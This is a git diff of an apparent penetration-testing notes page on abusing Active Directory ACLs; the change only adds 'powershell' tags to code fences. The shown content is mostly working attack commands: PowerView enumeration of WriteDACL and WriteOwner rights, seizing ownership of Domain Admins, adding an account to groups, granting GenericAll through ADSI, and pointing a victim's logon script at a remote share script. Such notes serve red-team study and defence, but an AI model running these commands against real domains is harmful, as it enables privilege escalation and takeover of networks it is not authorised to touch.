@@ -4,13 +4,13 @@
 
 Find domain groups that current user has `WriteDACL` access right to:
 
-```
+```powershell
 PowerView3 > Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | % {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | % {if ($_.Identity -eq $("$env:UserDomain\$env:UserName")) {$_}} | ? {$_.ActiveDirectoryRights -like "*WriteDacl*"}
 ```
 
 The attacker can take the full control of discovered groups and then add a users to them:
 
-```
+```powershell
 PowerView3 > Add-DomainObjectAcl -TargetIdentity "IT Desk" -PrincipalIdentity snovvcrash -Domain tricky.com -Rights All -Verbose
 PowerView3 > Add-DomainGroupMember -Identity "IT Desk" -Members snovvcrash -Verbose
 ```
@@ -25,25 +25,25 @@ Cmd > klist purgeCmd > gpupdate /forceCmd > dir \\dc1.megacorp.local\c$
 
 before the attack the owner of Domain Admins is Domain Admins. After the ACE enumeration, if we find that a user in our control has `WriteOwner` rights on `ObjectType:All`
 
-```
+```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 ```
 
 we can change the `Domain Admins` object's owner to our user, which in our case is `spotless`. Note that the SID specified with `-Identity` is the SID of the `Domain Admins` group:
 
-```
+```powershell
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
 ```
 
 ### <mark style="color:orange;">GenericWrite on User</mark>
 
-```
+```powershell
 Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
 
 `WriteProperty` on an `ObjectType`, which in this particular case is `Script-Path`, allows the attacker to overwrite the logon script path of the `delegate` user, which means that the next time, when the user `delegate` logs on, their system will execute our malicious script:
 
-```
+```powershell
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
 
@@ -53,7 +53,7 @@ the user's ~~`delegate`~~ logon script field gets updated in the AD.
 
 If you are the owner of a group And you have a `WriteDACL` on that AD object, you can give yourself `GenericAll` privileges with a sprinkle of ADSI sorcery:
 
-```
+```powershell
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
 $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
@@ -67,7 +67,7 @@ This effectively means that you can now add new users to the group.
 
 Interesting to note that I could not abuse these privileges by using Active Directory module and `Set-Acl` / `Get-Acl` cmdlets:
 
-```
+```powershell
 $path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
 $acl = Get-Acl -Path $path
 $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
